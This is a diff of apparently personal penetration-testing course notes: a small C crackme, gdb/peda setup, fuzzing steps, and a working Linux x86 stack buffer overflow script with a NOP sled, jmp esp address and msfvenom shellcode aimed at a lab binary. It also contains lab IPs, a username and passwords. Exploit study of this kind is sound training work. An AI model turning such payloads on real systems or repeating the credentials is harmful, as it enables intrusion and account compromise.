@@ -1,7 +1,7 @@
 OSCP course - pen test gold standard certification
 MY LINUX IP - 10.50.179.45
 Windows IP - 10.50.179.48
-141/202
+223/265
 
 USERNAME: JUDU-021-M
 PASSWORD: fawskB5s0FnC
@@ -220,13 +220,13 @@ mem2
 
 int firstKey(key1)
 {
-    int key2 = atoi(key1);         // makes key2 and sets the value to key1, converting to integer if ASCII
-	int p2 = 29;               // declares integer p2 and sets it to 29
-    if ((key2-123)==0)             // if key2 is equal to 123
+    int key2 = atoi(key1);          // makes key2 and sets the value to key1, converting to integer if ASCII
+	int p2 = 29;                    // declares integer p2 and sets it to 29
+    if ((key2-123)==0)              // if key2 is equal to 123
     {
-        return 13555;              // output '13555'
+        return 13555;               // output '13555'
     }
-    return 12;                     // output '12'
+    return 12;                      // output '12'
 }
 
 int main(void) 
@@ -238,28 +238,106 @@ int main(void)
     if (firstKey(key1)==13555)      // calls the firstKey function, giving it the key1 array as a variable, then checks if output is equal to 13555
     {
         printf("Success!!.\n");     // prints 'Success!!' to the screen, kicks down to a new line
-	    Sleep(5000);            // waits 5 seconds
-		return 0;           // terminates the program
+	    Sleep(5000);                // waits 5 seconds
+		return 0;                   // terminates the program
     }
     else
     {
         printf("Failed!!.\n", key1); // prints 'Failed!!' to the screen and kicks down to a new line
-	    Sleep(5000);             // waits 5 seconds
-		return 0;            // terminates the program
+	    Sleep(5000);                 // waits 5 seconds
+		return 0;                    // terminates the program
     }
 }
 ----------------------------------------------------------------------------------------------------------------------------
-8011
-if iVar2 = 674 = success
-iVar2 = Function60
-Function60:
-	if localc + local10 = 17535 then win
 
+#########################################################################################################################
+##                                                     DAY 5                                                           ## 
+##                                              Exploit Developnent                                                    ##                                                                                                                #
+#########################################################################################################################
 
+Installation of peda plugin
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
 
+Common peda Commands
+disass <FUNCTION>   #   Disassemble portion of the program
+info <...>  #   Supply info for specific stack areas
+x/256c $<REGISTER>  #   Read characters from specific register
+break <address>  #   Establish a break point
 
+---------------------------------------------------------------------------------------------------------------------------------
+## STATIC ANALYSIS
+strings <program> | head
+file <program> (ELF means exe)
 
+## BEHAVIORAL ANALYSIS
+chmod u+x func
 
+# DYNAMIC ANALYSIS
+## FUZZING
+./func $(echo "12345678") ##pass arguments
+./func <<<$(echo "12345678") ##simulates user input
+./func <<<$(echo "<bunch of random shit>")
+
+## DISASSEMBLY
+gdb ./func
+shell > exit
+quit ##break out of gdb
+
+info functions
+
+run or start
+
+disass or pdisass main ## pdisass other functions
+
+python spaghetti.py
+
+print offset
+
+run <<<$(python spaghetti.py)
+
+do some shit where you go to wiremask.eu and tools > buffer overflow randomizer > and put in 100 and run it. After that it should tell you the address of EIP and you 
+gotta plug that into the offset field to get the exact address required to trigger the overflow. After that you may plug that into the offset field in your python script to do the thing.
+
+**-------------------------------**SCRIPT**----------------------------------------**
+#!/usr/bin/env python
+offset = "A" * 62
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 10
+buf =  b""
+buf += b"\xd9\xc2\xd9\x74\x24\xf4\xbd\x4d\x78\xe0\xdd\x58"
+buf += b"\x33\xc9\xb1\x0b\x31\x68\x19\x83\xe8\xfc\x03\x68"
+buf += b"\x15\xaf\x8d\x8a\xd6\x77\xf7\x19\x8f\xef\x2a\xfd"
+buf += b"\xc6\x08\x5c\x2e\xaa\xbe\x9d\x58\x63\x5c\xf7\xf6"
+buf += b"\xf2\x43\x55\xef\x02\x83\x5a\xef\x7b\xeb\x35\x8e"
+buf += b"\xee\x82\xc9\x07\xa2\xdd\x2b\x6a\xc4"
+print (offset+eip+nop+buf)
+
+#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
+# Setup GDB environment and Find jmp esp addresses
+'''
+shell 
+env - gdb ./func
+show env 
+unset env COLUMNS
+unset env LINES
+run and ctrl+c or start
+info proc map
+'''
+# grab first address after heap, last address before stack
+# 0xf7de1000 0xf7ffe000
+# find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4
+'''
+PLACE LITTLE ENDIAN CONVERSION IN EIP
+0xf7|de|3b|59 > \x59\x3b\xde\xf7 
+0xf7|f5|88|ab > \xab\x88\xf5\xf7
+0xf7|f6|45|fb > \xfb\x45\xf6\xf7
+'''
+# msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
+
+**----------------------------------------------------------------------------------**
+111: 2222
+StudentWebExploitPassword
 
 
 
